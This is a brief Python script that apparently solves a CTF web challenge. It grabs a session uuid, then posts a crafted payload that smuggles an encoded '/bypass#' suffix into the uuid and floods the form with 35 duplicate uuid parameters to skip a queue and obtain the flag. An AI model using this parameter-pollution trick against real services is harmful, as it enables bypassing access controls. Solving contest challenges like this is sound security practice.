import requests

FLAG_SERVER_URL = "https://qu-flag.lac.tf"

s = requests.Session()
r = s.get(FLAG_SERVER_URL)
QUEUE_SERVER_URL = r.url
UUID = r.cookies["uuid"]
print(UUID)

payload = 'uuid=' + UUID + '%2Fbypass%23' + '&uuid=0' * 35
s.post(FLAG_SERVER_URL, data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded','Cookie': 'uuid=' + UUID})

assert("continue" in s.get(QUEUE_SERVER_URL).text)

flag = s.post(FLAG_SERVER_URL, data={'uuid': UUID})

print(flag.text)
